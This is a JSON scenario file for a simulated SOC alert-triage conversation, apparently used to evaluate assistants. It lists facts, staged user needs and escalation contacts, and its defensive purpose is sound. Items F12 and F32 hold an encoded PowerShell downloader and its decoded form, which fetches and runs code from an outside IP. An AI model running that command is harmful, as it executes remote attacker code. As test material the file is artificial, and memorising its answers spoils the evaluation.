@@ -1,0 +1,435 @@
+{
+  "scenario_id": "cyber_alert_triage_01",
+  "domain": "cybersecurity_incident_response",
+  "description": "A security analyst receives a cluster of similar alerts and needs to distinguish background noise from the small number of signals that genuinely deserve escalation. All company names are fictional.",
+  "user_profile": {
+    "persona": "29-year-old SOC analyst early in the morning shift",
+    "context": "The alert volume is high enough that the risk is no longer missing nothing, but missing the one alert that matters",
+    "communication_style": "Focused and evidence-driven, prefers clear triage criteria"
+  },
+  "fact_sheet": [
+    {
+      "id": "F01",
+      "category": "analyst_profile",
+      "fact": "The security analyst's name is Alex Chen, employee ID AC-7749."
+    },
+    {
+      "id": "F02",
+      "category": "analyst_profile",
+      "fact": "Alex Chen is working from SOC workstation Delta-7."
+    },
+    {
+      "id": "F03",
+      "category": "analyst_profile",
+      "fact": "Alex Chen holds the CompTIA Security+ and GIAC Certified Incident Handler (GCIH) certifications."
+    },
+    {
+      "id": "F04",
+      "category": "shift_context",
+      "fact": "The current morning shift runs from 06:00 to 14:00 UTC on September 26, 2024."
+    },
+    {
+      "id": "F05",
+      "category": "shift_context",
+      "fact": "As of 06:15 UTC, there are 212 unassigned alerts in the primary queue."
+    },
+    {
+      "id": "F06",
+      "category": "shift_context",
+      "fact": "The handover note from the night shift mentions a planned vulnerability scan by the IT team starting at 05:00 UTC targeting the 10.20.0.0/16 subnet."
+    },
+    {
+      "id": "F07",
+      "category": "shift_context",
+      "fact": "The primary communication channel for the SOC team is the Slack channel #soc-operations."
+    },
+    {
+      "id": "F08",
+      "category": "alert_details",
+      "fact": "The cluster of alerts is for rule OC-PS-113B: 'Suspicious PowerShell Execution with Encoded Command'."
+    },
+    {
+      "id": "F09",
+      "category": "alert_details",
+      "fact": "In the last 60 minutes, 47 alerts for rule OC-PS-113B have been generated."
+    },
+    {
+      "id": "F10",
+      "category": "alert_details",
+      "fact": "45 of the alerts originate from the internal IP address 10.20.5.15, which is the Nessus vulnerability scanner."
+    },
+    {
+      "id": "F11",
+      "category": "alert_details",
+      "fact": "Two alerts for rule OC-PS-113B originate from the user workstation with IP 10.100.15.212."
+    },
+    {
+      "id": "F12",
+      "category": "alert_details",
+      "fact": "The PowerShell command on host 10.100.15.212 contains the base64 encoded string 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAxADEANwAuADgAOAAuADIANQAxAC8AYQAnACkAKQA='."
+    },
+    {
+      "id": "F13",
+      "category": "alert_details",
+      "fact": "The script being executed on host 10.100.15.212 has a SHA256 hash of c3f7b7a1c4b0d5a3e1f8d9b6c9a8f2e7a1d3b0c4e5f6a7b8c9d0e1f2a3b4c5d6."
+    },
+    {
+      "id": "F14",
+      "category": "alert_details",
+      "fact": "The parent process for the suspicious PowerShell execution was `OUTLOOK.EXE` with process ID 8132."
+    },
+    {
+      "id": "F15",
+      "category": "triage_protocol",
+      "fact": "The Standard Operating Procedure (SOP) for this alert type is documented in Confluence under document ID 'SOP-CYB-301'."
+    },
+    {
+      "id": "F16",
+      "category": "triage_protocol",
+      "fact": "Step 1 of SOP-CYB-301 requires checking all indicators (IP, hash, domain) against the IntelStream threat intelligence platform."
+    },
+    {
+      "id": "F17",
+      "category": "triage_protocol",
+      "fact": "An alert can be marked as a false positive if the script is signed by OmniCorp's internal certificate authority and is part of a scheduled task."
+    },
+    {
+      "id": "F18",
+      "category": "triage_protocol",
+      "fact": "Initial triage for any high-priority alert must be completed within 15 minutes of assignment."
+    },
+    {
+      "id": "F19",
+      "category": "triage_protocol",
+      "fact": "Any PowerShell execution originating from an Office application (e.g., OUTLOOK.EXE, WINWORD.EXE) is automatically considered high priority."
+    },
+    {
+      "id": "F20",
+      "category": "tooling_configuration",
+      "fact": "The company SIEM is SpectraSIEM version 8.2."
+    },
+    {
+      "id": "F21",
+      "category": "tooling_configuration",
+      "fact": "The Endpoint Detection and Response tool is SentinelGuard EDR, with agent version 5.4.1 deployed on workstations."
+    },
+    {
+      "id": "F22",
+      "category": "tooling_configuration",
+      "fact": "The ticketing system, CaseFlow, is accessible at https://caseflow.omnicorp.internal."
+    },
+    {
+      "id": "F23",
+      "category": "tooling_configuration",
+      "fact": "The threat intelligence platform is IntelStream, accessible at https://intelstream.omnicorp.internal."
+    },
+    {
+      "id": "F24",
+      "category": "tooling_configuration",
+      "fact": "The correlation rule ID in SpectraSIEM that generates the alert is `CORR-7821`."
+    },
+    {
+      "id": "F25",
+      "category": "asset_information",
+      "fact": "The workstation at 10.100.15.212 is assigned to user 'j.doe' (Jane Doe) in the finance department."
+    },
+    {
+      "id": "F26",
+      "category": "asset_information",
+      "fact": "The CMDB lists Jane Doe's workstation, hostname `FIN-WKS-JDOE01`, as having access to sensitive financial reporting data."
+    },
+    {
+      "id": "F27",
+      "category": "asset_information",
+      "fact": "The business owner for all finance department assets is listed as David Schmidt, Director of Finance."
+    },
+    {
+      "id": "F28",
+      "category": "asset_information",
+      "fact": "The external IP address `185.117.88.251` has a geolocation of St. Petersburg, Russia."
+    },
+    {
+      "id": "F29",
+      "category": "asset_information",
+      "fact": "Jane Doe's user account `j.doe` is a member of the 'Finance_Managers' Active Directory group."
+    },
+    {
+      "id": "F30",
+      "category": "threat_intelligence",
+      "fact": "IntelStream has a report from 3 days ago linking the IP address 185.117.88.251 to command-and-control infrastructure for the 'Shadow Cat' APT group."
+    },
+    {
+      "id": "F31",
+      "category": "threat_intelligence",
+      "fact": "The 'Shadow Cat' group is known to target financial institutions using phishing emails with malicious macros that launch encoded PowerShell commands."
+    },
+    {
+      "id": "F32",
+      "category": "threat_intelligence",
+      "fact": "The decoded PowerShell command from alert OC-PS-113B is `IEX (New-Object Net.WebClient).DownloadString('http://185.117.88.251/a')`, a common first-stage downloader."
+    },
+    {
+      "id": "F33",
+      "category": "escalation_path",
+      "fact": "The on-duty Tier 2 Incident Responder is Sarah Jenkins, contactable via Slack @sjenkins."
+    },
+    {
+      "id": "F34",
+      "category": "escalation_path",
+      "fact": "To escalate, a 'Severity 1' ticket must be created in CaseFlow, and the `#soc-escalations` channel must be notified with the ticket number."
+    },
+    {
+      "id": "F35",
+      "category": "escalation_path",
+      "fact": "The SOC Team Lead, Maria Rodriguez, must be immediately notified via phone call at +1-212-555-0199 for any confirmed compromise of a finance department asset."
+    },
+    {
+      "id": "F36",
+      "category": "alert_details",
+      "fact": "All 47 alerts in the current OC-PS-113B cluster originate from exactly two source IP addresses: 45 alerts from 10.20.5.15 and 2 alerts from 10.100.15.212; no other source IP addresses are present in this cluster."
+    }
+  ],
+  "user_needs": [
+    {
+      "id": "N1",
+      "description": "What is the name of the alert rule that has clustered, and how many alerts have been generated in the last hour?",
+      "level": "must-have",
+      "key_fact_ids": [
+        "F08",
+        "F09"
+      ],
+      "predictable_after": null,
+      "prediction_reason": null,
+      "turn_order": 1,
+      "reveal_group": "G1",
+      "reveal_group_label": "Initial Alert Triage",
+      "reveal_priority": 1
+    },
+    {
+      "id": "N2",
+      "description": "What are the source IP addresses represented across all alerts in this cluster?",
+      "level": "must-have",
+      "key_fact_ids": [
+        "F10",
+        "F11",
+        "F36"
+      ],
+      "predictable_after": "N1",
+      "prediction_reason": "CROSS-GROUP: After identifying the alert cluster, the immediate next step is to differentiate the sources to understand the scope.",
+      "turn_order": 2,
+      "reveal_group": "G2",
+      "reveal_group_label": "Alert Source Analysis",
+      "reveal_priority": 1
+    },
+    {
+      "id": "N3",
+      "description": "Is there any planned activity mentioned in the shift handover that would explain the alerts from 10.20.5.15?",
+      "level": "must-have",
+      "key_fact_ids": [
+        "F06",
+        "F10"
+      ],
+      "predictable_after": "N2",
+      "prediction_reason": "Intra-group: Seeing a high volume of alerts from a single internal IP naturally leads to checking for known, legitimate activity like a vulnerability scan.",
+      "turn_order": 3,
+      "reveal_group": "G2",
+      "reveal_group_label": "Alert Source Analysis",
+      "reveal_priority": 2
+    },
+    {
+      "id": "N4",
+      "description": "For the two alerts from 10.100.15.212, what is the full encoded PowerShell command?",
+      "level": "must-have",
+      "key_fact_ids": [
+        "F11",
+        "F12"
+      ],
+      "predictable_after": "N3",
+      "prediction_reason": "CROSS-GROUP: Once the noise from the scanner is explained, the focus immediately shifts to the remaining outliers to begin deeper investigation.",
+      "turn_order": 4,
+      "reveal_group": "G3",
+      "reveal_group_label": "Anomaly Investigation",
+      "reveal_priority": 1
+    },
+    {
+      "id": "N5",
+      "description": "What is the decoded content of the PowerShell command?",
+      "level": "must-have",
+      "key_fact_ids": [
+        "F32"
+      ],
+      "predictable_after": "N4",
+      "prediction_reason": "CROSS-GROUP: Discovering an encoded command makes decoding it the absolute next step to understand the attacker's intent.",
+      "turn_order": 5,
+      "reveal_group": "G4",
+      "reveal_group_label": "Payload and Indicator Analysis",
+      "reveal_priority": 1
+    },
+    {
+      "id": "N6",
+      "description": "What does our threat intelligence platform say about the IP address 185.117.88.251 found in the decoded command?",
+      "level": "must-have",
+      "key_fact_ids": [
+        "F30"
+      ],
+      "predictable_after": "N5",
+      "prediction_reason": "Intra-group: After extracting an indicator of compromise (the IP address) from the payload, the standard procedure is to check it against threat intelligence.",
+      "turn_order": 6,
+      "reveal_group": "G4",
+      "reveal_group_label": "Payload and Indicator Analysis",
+      "reveal_priority": 2
+    },
+    {
+      "id": "N7",
+      "description": "Who is the user assigned to workstation 10.100.15.212 and what kind of data do they access?",
+      "level": "must-have",
+      "key_fact_ids": [
+        "F25",
+        "F26"
+      ],
+      "predictable_after": "N6",
+      "prediction_reason": "CROSS-GROUP: Confirming the external IP is malicious shifts the investigation from 'what is happening' to 'who is impacted'.",
+      "turn_order": 7,
+      "reveal_group": "G5",
+      "reveal_group_label": "Asset and Impact Context",
+      "reveal_priority": 1
+    },
+    {
+      "id": "N8",
+      "description": "What was the parent process that launched this PowerShell command?",
+      "level": "must-have",
+      "key_fact_ids": [
+        "F14"
+      ],
+      "predictable_after": "N7",
+      "prediction_reason": "Intra-group: After identifying the user and asset, determining the entry vector (the parent process) is crucial for understanding how the compromise occurred.",
+      "turn_order": 8,
+      "reveal_group": "G5",
+      "reveal_group_label": "Asset and Impact Context",
+      "reveal_priority": 2
+    },
+    {
+      "id": "N9",
+      "description": "What is the immediate notification requirement for a confirmed compromise of a finance department asset?",
+      "level": "must-have",
+      "key_fact_ids": [
+        "F35"
+      ],
+      "predictable_after": "N7",
+      "prediction_reason": "CROSS-GROUP: Once the analyst confirms that the suspicious activity is tied to Jane Doe's finance workstation and that the asset has access to sensitive financial reporting data, the immediate next step is to follow the notification requirement for a confirmed compromise of a finance department asset.",
+      "turn_order": 9,
+      "reveal_group": "G6",
+      "reveal_group_label": "Escalation Protocol",
+      "reveal_priority": 1
+    },
+    {
+      "id": "N10",
+      "description": "Who is the on-duty Tier 2 responder and what is their contact information?",
+      "level": "nice-to-have",
+      "key_fact_ids": [
+        "F33"
+      ],
+      "predictable_after": "N9",
+      "prediction_reason": "CROSS-GROUP: After learning the general escalation policy, the analyst needs the specific contact details to execute that policy.",
+      "turn_order": 10,
+      "reveal_group": "G7",
+      "reveal_group_label": "Escalation Contact",
+      "reveal_priority": 1
+    },
+    {
+      "id": "N11",
+      "description": "Which of my professional certifications are on record?",
+      "level": "nice-to-have",
+      "key_fact_ids": [
+        "F03"
+      ],
+      "predictable_after": null,
+      "prediction_reason": null,
+      "turn_order": 11,
+      "reveal_group": "G8",
+      "reveal_group_label": "Analyst Profile Information",
+      "reveal_priority": 1
+    }
+  ],
+  "reveal_groups": [
+    {
+      "group_id": "G1",
+      "label": "Initial Alert Triage",
+      "member_need_ids": [
+        "N1"
+      ],
+      "trigger_after": null
+    },
+    {
+      "group_id": "G2",
+      "label": "Alert Source Analysis",
+      "member_need_ids": [
+        "N2",
+        "N3"
+      ],
+      "trigger_after": "G1"
+    },
+    {
+      "group_id": "G3",
+      "label": "Anomaly Investigation",
+      "member_need_ids": [
+        "N4"
+      ],
+      "trigger_after": "G2"
+    },
+    {
+      "group_id": "G4",
+      "label": "Payload and Indicator Analysis",
+      "member_need_ids": [
+        "N5",
+        "N6"
+      ],
+      "trigger_after": "G3"
+    },
+    {
+      "group_id": "G5",
+      "label": "Asset and Impact Context",
+      "member_need_ids": [
+        "N7",
+        "N8"
+      ],
+      "trigger_after": "G4"
+    },
+    {
+      "group_id": "G6",
+      "label": "Escalation Protocol",
+      "member_need_ids": [
+        "N9"
+      ],
+      "trigger_after": "G5"
+    },
+    {
+      "group_id": "G7",
+      "label": "Escalation Contact",
+      "member_need_ids": [
+        "N10"
+      ],
+      "trigger_after": "G6"
+    },
+    {
+      "group_id": "G8",
+      "label": "Analyst Profile Information",
+      "member_need_ids": [
+        "N11"
+      ],
+      "trigger_after": null
+    }
+  ],
+  "simulator_config": {
+    "need_reveal_strategy": "grouped",
+    "patience": "medium",
+    "max_turns": 10
+  },
+  "metadata": {
+    "seed_id": "cyber_alert_triage_01",
+    "variant": null,
+    "generated_by": "gemini-2.5-pro",
+    "reviewed": false,
+    "review_status": null
+  }
+}
